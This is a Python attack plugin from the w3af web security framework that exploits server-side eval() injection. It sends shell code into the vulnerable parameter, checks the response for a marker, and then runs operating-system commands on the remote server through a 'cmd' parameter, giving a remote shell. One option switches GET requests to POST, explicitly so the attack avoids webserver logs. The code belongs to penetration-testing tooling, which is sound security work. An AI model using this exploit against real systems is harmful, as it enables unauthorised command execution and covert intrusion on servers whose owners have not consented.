'''
eval.py

Copyright 2009 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


import core.controllers.output_manager as om

# options
from core.data.options.opt_factory import opt_factory
from core.data.options.option_list import OptionList

from core.controllers.plugins.attack_plugin import AttackPlugin
from core.controllers.exceptions import w3afException
from core.data.parsers.url import parse_qs

# Advanced shell stuff
from core.data.kb.exec_shell import exec_shell as exec_shell

import plugins.attack.payloads.shell_handler as shell_handler
from plugins.attack.payloads.decorators.exec_decorator import exec_debug


class eval(AttackPlugin):
    '''
    Exploit eval() vulnerabilities.
    
    @author: Andres Riancho (andres.riancho@gmail.com)
    '''

    def __init__(self):
        AttackPlugin.__init__(self)
        
        # Internal variables
        self._shell_code = None
        
        # User configured variables
        self._changeToPost = True
        self._url = 'http://host.tld/'
        self._method = 'GET'
        self._data = ''
        self._inj_var = ''
        self._generate_only_one = True

    def fastExploit(self, url, method, data ):
        '''
        Exploits a web app with remote file include vuln.
        
        @param url: A string containing the Url to exploit ( http://somehost.com/foo.php )
        @param method: A string containing the method to send the data ( post / get )
        @param data: A string containing data to send with a mark that defines
        which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
        '''
        return None
    
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'shell'
    
    def getVulnName2Exploit( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.os_commanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
        
        Then the exploit plugin that exploits os_commanding ( attack.os_commanding ) should
        return 'os_commanding' in this method.
        '''
        return 'eval'
        
    def _generate_shell( self, vuln_obj ):
        '''
        @param vuln_obj: The vuln to exploit.
        @return: A shell object based on the vuln that is passed as parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verify_vuln( vuln_obj ):
            # Create the shell object
            shell_obj = eval_shell( vuln_obj )
            shell_obj.set_url_opener( self._uri_opener )
            shell_obj.set_cut( self._header_length, self._footer_length )
            shell_obj.setCode( self._shell_code )
            return shell_obj
        else:
            return None

    def _verify_vuln( self, vuln_obj ):
        '''
        This command verifies a vuln. This is really hard work!

        @param vuln_obj: The vulnerability to exploit.
        @return : True if vuln can be exploited.
        '''
        # Get the shells
        extension = vuln_obj.getURL().getExtension()
        # I get a list of tuples with code and extension to use
        shell_code_list = shell_handler.get_shell_code( extension )
        
        for code, real_extension in shell_code_list:
            # Prepare for exploitation...
            function_reference = getattr( self._uri_opener , vuln_obj.get_method() )
            data_container = vuln_obj.get_dc()
            data_container[ vuln_obj.get_var() ] = code

            try:
                http_res = function_reference( vuln_obj.getURL(), str(data_container) )
            except Exception:
                continue
            else:
                cut_result = self._define_exact_cut( http_res.getBody(), shell_handler.SHELL_IDENTIFIER )
                if cut_result:
                    self._shell_code = code
                    return True
        
        # All failed!
        return False
    
    def get_options( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        d0 = 'If the vulnerability was found in a GET request, try to change the method to POST'
        d0 += ' during exploitation.'
        h0 = 'If the vulnerability was found in a GET request, try to change the method to POST'
        h0 += ' during exploitation; this is usefull for not being logged in the webserver logs.'
        o0 = opt_factory('changeToPost', self._changeToPost, d0, 'boolean', help=h0)
        
        d1 = 'URL to exploit with fastExploit()'
        o1 = opt_factory('url', self._url, d1, 'url')
        
        d2 = 'Method to use with fastExploit()'
        o2 = opt_factory('method', self._method, d2, 'string')

        d3 = 'Data to send with fastExploit()'
        o3 = opt_factory('data', self._data, d3, 'string')

        d4 = 'Variable where to inject with fastExploit()'
        o4 = opt_factory('injvar', self._inj_var, d4, 'string')

        d5 = 'Exploit only one vulnerability.'
        o5 = opt_factory('generateOnlyOne', self._generate_only_one, d5, 'boolean')
        
        ol = OptionList()
        ol.add(o0)
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        ol.add(o5)
        return ol

    def set_options( self, options_list ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of get_options().
        
        @param options_list: A dict with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._changeToPost = options_list['changeToPost'].get_value()
        self._url = options_list['url'].get_value()
        self._method = options_list['method'].get_value()
        self._data = parse_qs( options_list['data'].get_value() )
        self._inj_var = options_list['injvar'].get_value()
        self._generate_only_one = options_list['generateOnlyOne'].get_value()
                
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        '''
        return 0.8
    
    def get_long_desc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits eval() vulnerabilities and returns a remote shell. 
        
        Six configurable parameters exist:
            - changeToPost
            - url
            - method
            - injvar
            - data
            - generateOnlyOne
        '''
        
class eval_shell(exec_shell):
    
    def setCode(self, code):
        self._shell_code = code

    @exec_debug    
    def execute( self, command ):
        '''
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        @param command: The command to handle ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        # Lets send the command.
        function_reference = getattr( self._uri_opener , self.get_method() )
        exploit_dc = self.get_dc()
        exploit_dc[ 'cmd' ] = command
        exploit_dc[ self.get_var() ] = self._shell_code
        try:
            response = function_reference( self.getURL() , str(exploit_dc) )
        except w3afException, e:
            return 'Error "' + str(e) + '" while sending command to remote host. Please try again.'
        else:
            return self._cut( response.getBody() )
        
    def end( self ):
        '''
        Finish execution, clean-up, clear the local web server.
        '''
        om.out.debug('eval() shell is cleaning up.')
    
    def get_name( self ):
        return 'eval_shell'
